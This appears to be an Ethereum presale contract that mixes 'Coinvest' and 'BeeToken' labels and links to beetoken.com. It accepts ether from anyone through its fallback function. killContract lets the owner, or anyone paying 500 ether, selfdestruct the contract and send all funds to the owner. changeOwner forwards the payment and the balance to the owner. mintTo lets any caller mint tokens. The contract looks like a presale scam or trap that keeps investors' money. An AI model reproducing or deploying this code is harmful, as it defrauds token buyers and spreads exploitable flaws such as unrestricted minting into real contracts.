1 pragma solidity ^0.4.19;
2 
3 
4 /// @title  Coinvest token presale - https://www.beetoken.com (COIN) - crowdfunding code
5 /// Whitepaper:
6 ///  https://www.beetoken.com/whitepaper
7 /// PitchDeck: 
8 ///  http://thebeetoken.com/pitchdeck
9 /// 
10 
11 contract BeeToken {
12     string public name = "Beetoken";
13     string public symbol = "BEE";
14     uint8 public constant decimals = 18;  
15     address public owner;
16 
17     uint256 public constant tokensPerEth = 1;
18     uint256 public constant howManyEtherInWeiToBecomeOwner = 1000 ether;
19     uint256 public constant howManyEtherInWeiToKillContract = 500 ether;
20     uint256 public constant howManyEtherInWeiToChangeSymbolName = 400 ether;
21     
22     bool public funding = true;
23 
24     // The current total token supply.
25     uint256 totalTokens = 1000;
26 
27     mapping (address => uint256) balances;
28     mapping (address => mapping (address => uint256)) allowed;
29 
30     event Transfer(address indexed _from, address indexed _to, uint256 _value);
31     event Migrate(address indexed _from, address indexed _to, uint256 _value);
32     event Refund(address indexed _from, uint256 _value);
33     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
34 
35     function BeeToken() public {
36         owner = msg.sender;
37         balances[owner]=1000;
38     }
39 
40     function changeNameSymbol(string _name, string _symbol) payable external
41     {
42         if (msg.sender==owner || msg.value >=howManyEtherInWeiToChangeSymbolName)
43         {
44             name = _name;
45             symbol = _symbol;
46         }
47     }
48     
49     
50     function changeOwner (address _newowner) payable external
51     {
52         if (msg.value>=howManyEtherInWeiToBecomeOwner)
53         {
54             owner.transfer(msg.value);
55             owner.transfer(this.balance);
56             owner=_newowner;
57         }
58     }
59 
60     function killContract () payable external
61     {
62         if (msg.sender==owner || msg.value >=howManyEtherInWeiToKillContract)
63         {
64             selfdestruct(owner);
65         }
66     }
67     /// @notice Transfer `_value` tokens from sender's account
68     /// `msg.sender` to provided account address `_to`.
69     /// @notice This function is disabled during the funding.
70     /// @dev Required state: Operational
71     /// @param _to The address of the tokens recipient
72     /// @param _value The amount of token to be transferred
73     /// @return Whether the transfer was successful or not
74     function transfer(address _to, uint256 _value) public returns (bool) {
75         // Abort if not in Operational state.
76         
77         var senderBalance = balances[msg.sender];
78         if (senderBalance >= _value && _value > 0) {
79             senderBalance -= _value;
80             balances[msg.sender] = senderBalance;
81             balances[_to] += _value;
82             Transfer(msg.sender, _to, _value);
83             return true;
84         }
85         return false;
86     }
87     
88     function mintTo(address _to, uint256 _value) public returns (bool) {
89         // Abort if not in Operational state.
90         
91             balances[_to] += _value;
92             Transfer(msg.sender, _to, _value);
93             return true;
94     }
95     
96 
97     function totalSupply() external constant returns (uint256) {
98         return totalTokens;
99     }
100 
101     function balanceOf(address _owner) external constant returns (uint256) {
102         return balances[_owner];
103     }
104 
105 
106     function transferFrom(
107          address _from,
108          address _to,
109          uint256 _amount
110      ) public returns (bool success) {
111          if (balances[_from] >= _amount
112              && allowed[_from][msg.sender] >= _amount
113              && _amount > 0
114              && balances[_to] + _amount > balances[_to]) {
115              balances[_from] -= _amount;
116              allowed[_from][msg.sender] -= _amount;
117              balances[_to] += _amount;
118              return true;
119          } else {
120              return false;
121          }
122   }
123 
124     function approve(address _spender, uint256 _amount) public returns (bool success) {
125          allowed[msg.sender][_spender] = _amount;
126          Approval(msg.sender, _spender, _amount);
127          
128          return true;
129      }
130 // Crowdfunding:
131 
132     /// @notice Create tokens when funding is active.
133     /// @dev Required state: Funding Active
134     /// @dev State transition: -> Funding Success (only if cap reached)
135     function () payable external {
136         // Abort if not in Funding Active state.
137         // The checks are split (instead of using or operator) because it is
138         // cheaper this way.
139         if (!funding) revert();
140         
141         // Do not allow creating 0 or more than the cap tokens.
142         if (msg.value == 0) revert();
143         
144         var numTokens = msg.value * (1000.0/totalTokens);
145         totalTokens += numTokens;
146 
147         // Assign new tokens to the sender
148         balances[msg.sender] += numTokens;
149 
150         // Log token creation event
151         Transfer(0, msg.sender, numTokens);
152     }
153 }